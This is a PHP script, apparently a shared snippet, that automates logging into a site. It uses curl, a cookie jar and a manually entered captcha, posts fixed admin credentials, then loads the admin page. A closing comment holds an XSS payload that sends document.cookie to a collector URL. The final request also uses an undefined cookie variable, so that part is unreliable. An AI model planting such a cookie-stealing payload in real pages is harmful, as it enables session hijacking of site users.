<pre class="prettyprint lang-php linenums">&lt;?php

header("Content-type: text/html; charset=utf-8");

// flush();
// ob_flush();
/**
 &nbsp;* 模拟登录
 &nbsp;*/
//初始化变量
 $cookie_file = dirname(__FILE__)."tmp.cookie";
 
$login_url = "http://dd.com/user.php?s=/Public_login.html";
$verify_code_url = "http://dd.com/user.php?s=/Public_verify.html";

echo "正在获取COOKIE...\n&lt;br/&gt;";
$curl = curl_init();
$timeout = 5;
curl_setopt($curl, CURLOPT_URL, $login_url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($curl,CURLOPT_COOKIEJAR,$cookie_file); //获取COOKIE并存储
$contents = curl_exec($curl);
curl_close($curl);
 echo "COOKIE获取完成，正在取验证码...\n&lt;br/&gt;";
//取出验证码
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $verify_code_url);
curl_setopt($curl, CURLOPT_COOKIEFILE, $cookie_file);
curl_setopt($curl, CURLOPT_HEADER, 0);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$img = curl_exec($curl);
curl_close($curl);

 $fp = fopen("verifyCode.jpg","w");
fwrite($fp,$img);
fclose($fp);
echo "验证码取出完成，正在休眠，20秒内请把验证码填入code.txt并保存\n";
//停止运行20秒
sleep(20);
 echo "休眠完成，开始取验证码...\n&lt;br/&gt;";
 
 
$code = file_get_contents("code.txt");
echo "验证码成功取出：$code\n &lt;br/&gt;";
echo "正在准备模拟登录...\n &lt;br/&gt;";

//$post = "username=admin999&amp;password=admin888&amp;verifyCode=$code";

$post=array();
$post['username']='admin999';
$post['password']='admin888';
$post['verifyCode']=$code;

$uuuuurl='http://dd.com/user.php?s=/Public_doLogin.html';
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $uuuuurl);
curl_setopt($curl, CURLOPT_HEADER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
curl_setopt($curl, CURLOPT_COOKIEFILE, $cookie_file);
$result=curl_exec($curl);
echo $result;
curl_close($curl);


//这一块根据自己抓包获取到的网站上的数据来做判断
if(substr_count($result,"登录成功")){
    echo "登录成功\n";
    
    
    
}else{
    echo"登录失败\n";
}
    
echo "===============================================================";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://dd.com/admin.php');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_jar);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$ret = curl_exec($ch);
echo $ret;
curl_close($ch);

/*
&lt;script&gt;
window.location.href="http://localhost/1.php?a="+document.cookie;
&lt;/script&gt;
*/</pre>